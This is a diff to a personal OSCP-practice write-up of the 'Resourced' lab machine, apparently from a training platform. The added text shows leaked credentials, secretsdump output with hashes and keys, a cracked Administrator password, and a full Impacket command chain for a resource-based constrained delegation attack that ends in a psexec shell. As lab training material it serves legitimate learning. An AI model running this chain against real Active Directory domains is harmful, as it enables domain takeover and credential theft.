@@ -1,20 +1,36 @@
 # Resourced Writeup
 Name: Resourced
-Date:  
-Difficulty:  
+Date:  28/09/2022
+Difficulty:  Intermediate
 Goals:  
 - OSCP Prep 1/5 Medium Boxes in a day, writeups allowed
 - Improving Noting with BoxedName-Notes.md 
 Learnt:
+- Wonders of secrets dump
+- Sometimes escaping white is -7 worth of problem solving 
+- Impacket is awesome
+- Resource Based Contrained Delegation
+- Exfiltrate everything, dont skip trying to exfiltrate
+- Be more methodical noting TODO when handling data 
 
 ## Recon
 
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](Screenshots/ping.png)
 
+Resourced is a Active Directory box.
+Guest Account disabled. But through enum4linux we get credentials:
+![](passwordreminders.png)
+
+V.Ventz HotelCalifornia194!
+
+![](smbclientvventz.png)
+
+`Password\ Audit` got me.
 
 [Extract and Crack NDTS](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)
 
+This is what I had:
 ```
 [*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
 [*] Dumping cached domain logon information (domain/username:hash)
@@ -33,12 +49,60 @@ dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
 NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
 ```
 
+Then went back after trying this as I had never seen this sort of output other than dpapi keys
+`cd "Active Directory\ `
 
+I tried various ways of logging in rdp, winrm, psexec with various accounts
+![](nordp.png)
 
-## Exploit
+```bash
+impacket-secretsdump -ntds ntds.dit -system  system LOCAL > bigdump
+cat bigdump | grep ::: | awk -F: '{print $4}'
+# Crackstation the hases
+Administrator 12579b1666d4ac10f0f59f300776495f : ItachiUchiha888
+```
+
+I then exeperienced a rabbit hole with AD having all the hashes like that then I tried forging tickets, I thought I had crackmapexec L.Livingston as I saw he was a sysadmin...
+
+![](ticketer.png)
 
 ## Foothold
 
+L.Livingston is a sysadmin.
+Regardless I have not the time left I so learnt some Resource Based Contrained Delegation
+
 ## PrivEsc
 
-      
+![](Livingstone.png)
+
+Resource Based Contrained Delegation
+```bash
+# Kali - create a new machine account on the domain
+impacket-addcomputer $domain.local/$user -dc-ip $domaincontroller-ip $domaincontroller-ip  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+# Target - Verify 
+PS > get-adcomputer attack
+
+# Kali - Get delegation rights script to manage delegation rights
+wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
+# set sDS-AllowedToActOnBehalfOfOtherIdentity on new machine account
+sudo python3 rbcd.py -dc-ip $domaincontroller-ip -t $target -f 'ATTACK' -hashes :$hash $domain\\$user
+
+# Target - Verify
+PS> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
+
+# Kali - Get administrator service ticket
+impacket-getST -spn cifs/$dc.$domain.local $domain/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip $domaincontroller-ip 
+# export the KRB55CCNAME so that impacket can load the .ccache file
+export KRB5CCNAME=./Administrator.ccache
+# Append /etc/hosts file with 
+sudo sh -c 'echo "$domaincontroller-ip $domain.local dc.$domain.local" >> /etc/hosts'
+# Psexc in!
+sudo impacket-psexec -k -no-pass $dc.$domain.local -dc-ip $domaincontroller-ip
+```
+
+![](stepOne.png)
+![](stepTwo.png)
+![](stepThree.png)
+![](stepFour.png)
+![](stepFive.png)
+![](wow.png)
